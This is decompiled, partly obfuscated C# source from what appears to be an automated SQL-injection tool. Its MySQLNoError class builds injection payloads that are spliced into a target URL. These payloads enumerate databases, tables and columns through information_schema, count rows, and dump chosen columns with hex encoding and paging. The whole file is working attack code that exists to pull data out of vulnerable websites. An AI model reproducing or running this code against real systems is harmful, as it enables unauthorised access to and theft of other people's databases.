using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase
{
	// Token: 0x020000FF RID: 255
	public class MySQLNoError
	{
		// Token: 0x06001106 RID: 4358 RVA: 0x00074E18 File Offset: 0x00073018
		public static string Info(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, List<string> lColumn, string sEndUrl = "")
		{
			string text = Class54.smethod_4(oCollaction);
			string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(#)", "#"));
			string text2 = "";
			checked
			{
				string text3;
				if (sTraject.ToLower().Contains(" into outfile") | sTraject.ToLower().Contains(" into dumpfile"))
				{
					text2 = lColumn[0].Trim();
					text3 = text;
					text3 = text3.Replace("#", text2);
				}
				else
				{
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text2 = text2 + "," + Class54.string_3 + ",";
						}
						string str = lColumn[i].Trim();
						text2 += str;
					}
					text3 = text;
					text3 = text3.Replace("#", string.Concat(new string[]
					{
						"concat(",
						Class54.string_1,
						",#,",
						Class54.string_1,
						")"
					}));
					text3 = text3.Replace("#", newValue);
					if (lColumn.Count > 1)
					{
						text3 = text3.Replace("#", "concat(" + text2 + ")");
					}
					else
					{
						text3 = text3.Replace("#", text2);
					}
				}
				string text4 = sTraject.Replace("[t]", text3) + sEndUrl;
				return text4.Replace("  ", " ");
			}
		}

		// Token: 0x06001107 RID: 4359 RVA: 0x00074F90 File Offset: 0x00073190
		public static string DataBases(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string str = Class54.smethod_4(oCollaction);
			string text = "(select distinct " + str;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				Class54.string_1,
				",#,",
				Class54.string_1,
				")"
			}));
			string str2;
			if (limitX == -1)
			{
				text = text.Replace("#", "group_concat(schema_name)");
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata", Interaction.IIf(bCorrentDB, " where schema_name=database() and not schema_name=" + Class23.smethod_20("information_schema"), " where not schema_name=" + Class23.smethod_20("information_schema"))), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", "schema_name");
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + Class23.smethod_20("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str2 + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		// Token: 0x06001108 RID: 4360 RVA: 0x00075168 File Offset: 0x00073368
		public static string Tables(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string str = Class54.smethod_4(oCollaction);
			string text = "(select distinct " + str;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				Class54.string_1,
				",#,",
				Class54.string_1,
				")"
			}));
			string str2;
			if (limitX == -1)
			{
				text = text.Replace("#", "group_concat(table_name)");
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", "table_name");
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str2 + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		// Token: 0x06001109 RID: 4361 RVA: 0x00075308 File Offset: 0x00073508
		public static string Columns(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string str = Class54.smethod_4(oCollaction);
			string text = "(select distinct " + str;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				Class54.string_1,
				",#,",
				Class54.string_1,
				")"
			}));
			string str2;
			if (limitX == -1)
			{
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("group_concat(column_name", Interaction.IIf(bDataType, ",0x3a,replace(column_type,0x2c,0x3b)", "")), ")")));
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("column_name", Interaction.IIf(bDataType, ",0x3a,column_type", ""))));
				str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str2 + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		// Token: 0x0600110A RID: 4362 RVA: 0x00075508 File Offset: 0x00073708
		public static string Dump(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string str = Class54.smethod_4(oCollaction);
			string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(concat(#))", "#"));
			string text = Conversions.ToString(Interaction.IIf(false, "group_concat(#)", "concat(#)"));
			string text2 = Conversions.ToString(Interaction.IIf(bIFNULL, "ifnull(#,char(" + Conversions.ToString(32) + "))", "#"));
			string text3 = "(select " + str;
			text3 = text3.Replace("#", text.Replace("#", Class54.string_1 + ",#," + Class54.string_1));
			text3 = text3.Replace("#", newValue);
			string text4 = "";
			checked
			{
				int num = lColumn.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						text4 = text4 + "," + Class54.string_3 + ",";
					}
					string str2 = text2.Replace("#", lColumn[i].Trim());
					text4 += str2;
				}
				text3 = text3.Replace("#", text4);
				string text5;
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					text5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
				}
				else
				{
					text5 = sCustomQuery.Trim();
					text5 = text5.Replace("[x]", Conversions.ToString(limitX));
					text5 = text5.Replace("[y]", Conversions.ToString(limitY));
				}
				text3 = text3 + " " + text5 + ")";
				string text6 = sTraject.Replace("[t]", text3) + sEndUrl;
				return text6.Replace("  ", " ");
			}
		}

		// Token: 0x0600110B RID: 4363 RVA: 0x00075750 File Offset: 0x00073950
		public static string DumpNoKey(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string text = "";
			string str = Class54.smethod_4(oCollaction);
			string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(concat(#))", "#"));
			string text2 = Conversions.ToString(Interaction.IIf(false, "group_concat(#)", "concat(#)"));
			string text3 = Conversions.ToString(Interaction.IIf(bIFNULL, "ifnull(#,char(" + Conversions.ToString(32) + "))", "#"));
			string text4 = "(select " + str;
			if (!string.IsNullOrEmpty(text))
			{
				text4 = text4.Replace("#", text2.Replace("#", text + ",#," + text));
			}
			text4 = text4.Replace("#", newValue);
			string text5 = "";
			checked
			{
				int num = lColumn.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (string.IsNullOrEmpty(text))
					{
						if (i > 0)
						{
							text5 += ",";
						}
					}
					else if (i > 0)
					{
						text5 = text5 + "," + text + ",";
					}
					string str2 = text3.Replace("#", lColumn[i].Trim());
					text5 += str2;
				}
				text4 = text4.Replace("#", text5);
				string text6;
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					text6 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
				}
				else
				{
					text6 = sCustomQuery.Trim();
					text6 = text6.Replace("[x]", Conversions.ToString(limitX));
					text6 = text6.Replace("[y]", Conversions.ToString(limitY));
				}
				text4 = text4 + " " + text6 + ")";
				string text7 = sTraject.Replace("[t]", text4) + sEndUrl;
				return text7.Replace("  ", " ");
			}
		}

		// Token: 0x0600110C RID: 4364 RVA: 0x000759BC File Offset: 0x00073BBC
		public static string Count(string sTraject, MySQLCollactions oCollaction, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string str = "";
			string str2 = Class54.smethod_4(oCollaction);
			string text = "(select " + str2;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				Class54.string_1,
				",count(0),",
				Class54.string_1,
				")"
			}));
			switch (o)
			{
			case Schema.DATABASES:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + Class23.smethod_20("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.TABLES:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.COLUMNS:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.ROWS:
				str = Conversions.ToString(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)));
				break;
			}
			text = text + str + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}
	}
}
